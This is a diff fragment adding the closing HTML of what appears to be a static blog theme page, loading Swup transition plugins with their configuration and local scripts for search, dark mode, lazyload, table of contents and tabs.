+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
